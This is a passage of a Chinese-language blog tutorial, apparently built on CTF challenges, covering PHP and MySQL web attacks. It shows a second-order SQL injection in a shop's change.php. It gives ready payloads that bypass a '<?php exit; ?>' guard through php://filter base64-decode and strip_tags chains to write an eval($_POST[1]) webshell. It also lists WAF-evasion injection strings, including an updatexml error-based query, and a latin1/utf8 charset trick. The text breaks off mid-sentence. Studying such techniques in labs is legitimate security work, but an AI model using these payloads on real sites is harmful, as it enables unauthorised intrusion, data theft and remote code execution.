class=\"variable\">$re</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单提交成功&quot;</span>;</span><br></pre></td></tr></table></figure>\n<p>在 change.php, 中 address 没有进行关键字过滤，只是使用 addslashes 进行转义后进行了查询，因此注入点不会在 select 语句中，</p>\n<p>但查询完后修改 address 时，旧的 address 从数据库拿出来没有进行过滤，二次注入发生</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//change.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>]))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$pattern</span> = <span class=\"string\">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$user_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;user_name&quot;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$address</span> = <span class=\"title function_ invoke__\">addslashes</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;address&quot;</span>]);</span><br><span class=\"line\">    <span class=\"variable\">$phone</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&quot;phone&quot;</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$user_name</span>) || <span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>,<span class=\"variable\">$phone</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;no sql inject!&#x27;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `user` where `user_name`=&#x27;<span class=\"subst\">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class=\"subst\">&#123;$phone&#125;</span>&#x27;&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$fetch</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$fetch</span>) &amp;&amp; <span class=\"variable\">$fetch</span>-&gt;num_rows&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"variable\">$fetch</span>-&gt;<span class=\"title function_ invoke__\">fetch_assoc</span>();</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class=\"variable\">$address</span>.<span class=\"string\">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;address&#x27;</span>].<span class=\"string\">&quot;&#x27; where `user_id`=&quot;</span>.<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;user_id&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$result</span> = <span class=\"variable\">$db</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$result</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;error&#x27;</span>;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$db</span>-&gt;error);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;订单修改成功&quot;</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;未找到订单!&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;信息不全&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>因此我们在 confirm.php 插入数据库中时，提交注入语句</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190851989.png\" alt=\"image-20221023190851989\"></p>\n<p>在修改地址时二次引用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190938216.png\" alt=\"image-20221023190938216\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221023190949077.png\" alt=\"image-20221023190949077\"></p>\n<p>因为不是 ctf 教程，所以为什么 flag 在 flag.txt，flag.txt 为什么在根下就不赘述了</p>\n<p>[[CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar](buu [CISCN2019 华北赛区 Day1 Web5] CyberPunk.rar)</p>\n<p>然后接下来带来一些花活：</p>\n<h6 id=\"php-exit-绕过\"><a class=\"markdownIt-Anchor\" href=\"#php-exit-绕过\">#</a>  <code>&lt;?php exit; ?&gt;</code>  绕过</h6>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class=\"line\">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class=\"line\">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br></pre></td></tr></table></figure>\n<p>$content 在开头增加了 exit 过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上 if (!defined (xxx)) exit; 之类的限制）</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>P</mi></msub><mi>O</mi><mi>S</mi><mi>T</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mtext>是可以控制协议的，我们即可使用</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>协议</mtext><mo separator=\"true\">,</mo><mi>p</mi><mi>h</mi><mi>p</mi><mo>:</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mi>f</mi><mi>i</mi><mi>l</mi><mi>t</mi><mi>e</mi><mi>r</mi><mtext>流的</mtext><mi>b</mi><mi>a</mi><mi>s</mi><mi>e</mi><mn>64</mn><mo>−</mo><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mtext>方法，将</mtext></mrow><annotation encoding=\"application/x-tex\">_POST[&#x27;filename&#x27;]是可以控制协议的，我们即可使用 php://filter协议,php://filter流的base64-decode方法，将</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.13889em;\">P</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">m</span><span class=\"mord\"><span class=\"mord mathnormal\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">以</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">制</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">我</span><span class=\"mord cjk_fallback\">们</span><span class=\"mord cjk_fallback\">即</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">使</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">协</span><span class=\"mord cjk_fallback\">议</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord cjk_fallback\">流</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord mathnormal\">b</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\">6</span><span class=\"mord\">4</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">方</span><span class=\"mord cjk_fallback\">法</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">将</span></span></span></span> content 解码，利用 php base64_decode 函数特性去除 “死亡 exit”。</p>\n<p>因此我们可以找到两种 base64-decode 相关的绕过</p>\n<p>0x00 通过 base64 编码特性绕过</p>\n<p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p>\n<p>所以，当 $content 被加上了 <code>&lt;?php exit; ?&gt;</code>  以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。由于该语句中只有 phpexit 符合 base64 解码特性，因此其余的符号会被忽略。</p>\n<p>“phpexit” 一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个 “a” 一共 8 个字符。后面在拼接我们一句话木马的 base64 编码格式。这样在解码的时候 phpexita 会被解码为无用字符，我们的一句话木马被正常解码</p>\n<p>因此我们最终传入的 payload 为：</p>\n<p><code>txt=aPD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/read=convert.base64-decode/resource=aaa.php</code></p>\n<p>在 filename 解码时，a 和 phpexit 变为了乱码，我们的 eval ($_POST [1]) 最终留了下来</p>\n<p>0x01 利用字符串操作</p>\n<p><code>&lt;?php exit; ?&gt;</code>  实际上是一个 XML 标签，既然是 XML 标签，我们就可以利用 strip_tags 函数去除它，而 php://filter 刚好是支持这个方法的。</p>\n<p>利用如下 payload，我们便能去除 &lt;&gt; 中的内容  <code>php://filter/read=string.strip_tags/resource=php://input</code></p>\n<p>但问题在于，如果我们去除 &lt;&gt; 会导致我们的一句话木马也被去除。</p>\n<p>但 php://filter 允许使用多个过滤器，我们可以先将 webshell 用 base64 编码。在调用完成 strip_tags 后再进行 base64-decode。</p>\n<p>最终 payload 如下</p>\n<p><code>txt=PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==&amp;filename=php://filter/write=string.strip_tags | convert.base64-decode/resource=aaa.php</code></p>\n<p>filename 中的 string.strip_tags 先把 exit 的 &lt;&gt; 去除，在把我们提交的 base64 编码解码，最终只剩下 <code>&lt;?php eval($_POST[1];?)</code></p>\n<h5 id=\"带有waf过滤的sql注入\"><a class=\"markdownIt-Anchor\" href=\"#带有waf过滤的sql注入\">#</a> 带有 WAF 过滤的 SQL 注入</h5>\n<p>1. 过滤 and、or</p>\n<p>在过滤一遍的场景下可以尝试双写，大小写  less25，26</p>\n<p>在使用 preg_replace 过滤时，只会替换一次，但使用正则表达式时会匹配多次。</p>\n<p>或者使用逻辑运算符，使用 || 代替 or，&amp;&amp; 代替 and，但需要对 &amp;&amp; 进行编码 %26%26，URLcode 不用对 || 编码</p>\n<p>2. 过滤空格</p>\n<p>使用 /**/ 多行注释代替  Less 26</p>\n<p>%0a,% a0,%0b 代替空格 (不同的操作系统，不同的环境代替空格的符号也不同，windows 使用 % A0，产生乱码，无法代替空格，使用 %0a,linux 使用 % a0,%0b)</p>\n<p>使用 () 将语句括起来代替空格 [[极客大挑战 2019] HardSQL.zip](buu [极客大挑战 2019] HardSQL.zip)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?username=admin&amp;password=444%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like%27geek%27)),0x7e),1)%23</span><br></pre></td></tr></table></figure>\n<p>3. 过滤注释</p>\n<p>如果用单引号闭合，使用 and’1’='1 代替注释</p>\n<p>使用；%00 截断</p>\n<p>4.union select 过滤</p>\n<p>uniunion selecton select</p>\n<p>5. 过滤 =</p>\n<p>like</p>\n<p>regexp</p>\n<p>6.0x 通过 16 进制逃过</p>\n<h5 id=\"通过编码注入\"><a class=\"markdownIt-Anchor\" href=\"#通过编码注入\">#</a> 通过编码注入</h5>\n<ol>\n<li></li>\n</ol>\n<p>一些 mysql 不认识，但 php 认识的字符，只限制于 post</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]) &amp;&amp; <span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">&quot;flag.php&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_select_db</span>(<span class=\"string\">&#x27;adog&#x27;</span>);</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;set names utf8&quot;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$id</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;id&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$ps</span> = <span class=\"title function_ invoke__\">mysqli_real_escape_string</span>(<span class=\"title function_ invoke__\">trim</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;ps&#x27;</span>]));</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysqli_fetch_array</span>(<span class=\"title function_ invoke__\">mysqli_query</span>(<span class=\"string\">&quot;select * from users where id=&#x27;<span class=\"subst\">$id</span>&#x27; and ps=&#x27;<span class=\"subst\">$ps</span>&#x27;&quot;</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;id&#x27;</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$id</span> == <span class=\"string\">&#x27;adog&#x27;</span>) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;shabi&quot;</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">flag</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_connect</span>(<span class=\"string\">&quot;localhost&quot;</span>,<span class=\"string\">&quot;root&quot;</span>,<span class=\"string\">&quot;root123&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_select_db</span>(<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"string\">&quot;set names utf-8&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>;<span class=\"variable\">$i</span>&lt;<span class=\"number\">256</span>;<span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span> = <span class=\"title function_ invoke__\">chr</span>(<span class=\"variable\">$i</span>);</span><br><span class=\"line\">        <span class=\"variable\">$name</span> = <span class=\"title function_ invoke__\">mysql_real_escape_string</span>(<span class=\"string\">&quot;hehe&quot;</span>.<span class=\"variable\">$c</span>);</span><br><span class=\"line\">        <span class=\"variable\">$sql</span> = <span class=\"string\">&quot;select * from `demo` where `name`=`<span class=\"subst\">&#123;$name&#125;</span>`&quot;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$row</span> = <span class=\"title function_ invoke__\">mysql_fetch_array</span>(<span class=\"title function_ invoke__\">mysql_query</span>(<span class=\"variable\">$sql</span>));</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable\">$row</span>[<span class=\"string\">&#x27;name&#x27;</span>] == <span class=\"string\">&quot;hehe&quot;</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;<span class=\"subst\">&#123;$c&#125;</span> &lt;br/&gt;&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>通过上述脚本，我么可以查到一些 latin1 的单词，来绕过，比如 <code>Å</code></p>\n<ol start=\"2\">\n<li></li>\n</ol>\n<p>一些通过 get 提交，mysql 不认识，但 php 认识的字符，限制于 get</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$username</span> === <span class=\"string\">&#x27;admin&#x27;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$_SERVER</span>[<span class=\"string\">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class=\"string\">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;Permission denied!&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$mysqli</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"string\">&quot;SELECT * FROM z_users where username = &#x27;<span class=\"subst\">&#123;$username&#125;</span>&#x27; and password = &#x27;<span class=\"subst\">&#123;$password&#125;</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>\n<p>大概内容就是 username=admin 时会直接 die，不是 admin 但又查不出东西</p>\n<p>mysql 默认字符集为 latin1，根本原因为 mysql 字符集和 mysqli 客户端字符集不同。我们通过语句 <code>mysql_query(&quot;set names utf-8&quot;);</code>  , <code>set names utf8</code>  的意思是将客户端的字符集设置为 utf8。mysql 有如下几种 charset</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; show variables like &quot;%character%&quot;;</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| Variable_name            | Value                                    |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">| character_set_client     | utf8                                     |</span><br><span class=\"line\">| character_set_connection | utf8                                     |</span><br><span class=\"line\">| character_set_database   | gbk                                      |</span><br><span class=\"line\">| character_set_filesystem | binary                                   |</span><br><span class=\"line\">| character_set_results    | utf8                                     |</span><br><span class=\"line\">| character_set_server     | utf8                                     |</span><br><span class=\"line\">| character_set_system     | utf8                                     |</span><br><span class=\"line\">| character_sets_dir       | D:\\BtSoft\\mysql\\MySQL5.5\\share\\charsets\\ |</span><br><span class=\"line\">+--------------------------+------------------------------------------+</span><br><span class=\"line\">8 rows in set (0.04 sec)</span><br></pre></td></tr></table></figure>\n<p>在默认情况下，mysql 字符集为 latin1，而执行了 <code>set names utf8;</code>  以后， <code>character_set_client</code> 、 <code>character_set_connection</code> 、 <code>character_set_results</code>  等与客户端相关的配置字符集都变成了 utf8，但 <code>character_set_database</code> 、 <code>character_set_server</code>  等服务端相关的字符集还是 latin1。</p>\n<p>因为这一条语句，导致客户端、服务端的字符集出现了差别。既然有差别，Mysql 在执行查询的时候，就涉及到字符集的转换。</p>\n<ol>\n<li>MySQL Server 收到请求时将请求数据从 character_set_client 转换为 character_set_connection；</li>\n<li>进行内部操作前将请求数据从 character_set_connection 转换为内部操作字符集</li>\n</ol>\n<p><code>character_set_client</code>  和 <code>character_set_connection</code>  被设置成了 utf8，而 <code>内部操作字符集</code> 其实也就是 <code>username</code>  字段的字符集还是默认的 latin1。于是，整个操作就有如下字符串转换过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">utf8 --&gt; utf8 --&gt; latin1</span><br></pre></td></tr></table></figure>\n<p>最后执行比较 <code>username='admin'</code>  的时候， <code>'admin'</code>  是一个 latin1 字符串。</p>\n<p>因此对于以下 url：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:9090/test.php?username=admin%e4</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd</span><br><span class=\"line\">http://localhost:9090/test.php?username=admin%e4%bd%ac</span><br></pre></td></tr></table></figure>\n<p>前两个可以正常查询，但最后一个会产生错误，并且 url 中从 <code>%e4%bd%ac</code>  变为了 <code>佬</code></p>\n<p>在输入 % e4,% e4% bd 